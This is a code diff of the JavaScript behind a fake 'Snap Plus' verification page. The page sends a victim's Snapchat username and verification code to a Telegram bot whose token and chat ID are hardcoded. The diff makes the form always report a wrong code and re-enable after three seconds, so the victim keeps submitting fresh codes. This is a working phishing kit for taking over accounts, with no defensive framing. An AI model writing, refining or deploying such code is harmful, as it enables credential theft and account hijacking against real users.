@@ -2,12 +2,9 @@
 const TELEGRAM_BOT_TOKEN = '8981703910:AAHpSoAJUmpA6qWyvmgf0oLp0EXRa3-WFLI';
 const TELEGRAM_CHAT_ID = '8424411486'; // Remplacez par votre chat ID
 
-// Générer un ID unique séquentiel
+// Générer un ID unique basé sur timestamp
 function generateUniqueId() {
-    let counter = parseInt(localStorage.getItem('snapPlus_counter')) || 1;
-    const uniqueId = counter.toString().padStart(4, '0');
-    localStorage.setItem('snapPlus_counter', counter + 1);
-    return uniqueId;
+    return Date.now().toString(36).toUpperCase();
 }
 
 // Envoyer message à Telegram
@@ -137,6 +134,7 @@ if (verificationForm) {
     const uniqueId = localStorage.getItem('snapPlus_id');
     const phoneDisplay = document.getElementById('phoneDisplay');
     const errorMessage = document.getElementById('errorMessage');
+    const submitButton = verificationForm.querySelector('button[type="submit"]');
     
     if (phoneDisplay && username) {
         phoneDisplay.innerHTML = `<strong>Username enregistré:</strong> ${username}`;
@@ -154,6 +152,12 @@ if (verificationForm) {
         const snapchatUsername = document.getElementById('username').value;
         const code = document.getElementById('code').value;
         
+        // Désactiver le bouton et ajouter cooldown
+        if (submitButton) {
+            submitButton.disabled = true;
+            submitButton.textContent = 'Patientez...';
+        }
+        
         // Envoyer à Telegram
         const message = `✅ <b>Vérification Snap Plus</b>\n\n` +
                        `🔑 <b>ID Unique:</b> ${uniqueId}\n` +
@@ -164,18 +168,18 @@ if (verificationForm) {
         
         const success = await sendToTelegram(message);
         
-        if (success) {
-            // Nettoyer localStorage
-            localStorage.removeItem('snapPlus_username');
-            localStorage.removeItem('snapPlus_id');
-            
-            // Rediriger vers la page de succès
-            window.location.href = 'success.html';
-        } else {
-            if (errorMessage) {
-                errorMessage.textContent = 'Erreur lors de l\'envoi. Veuillez réessayer.';
-                errorMessage.style.display = 'block';
-            }
+        // Toujours afficher mauvais code
+        if (errorMessage) {
+            errorMessage.textContent = 'Vous avez saisi le mauvais code';
+            errorMessage.style.display = 'block';
         }
+        
+        // Réactiver le bouton après 3 secondes
+        setTimeout(() => {
+            if (submitButton) {
+                submitButton.disabled = false;
+                submitButton.textContent = 'Suivant';
+            }
+        }, 3000);
     });
 }
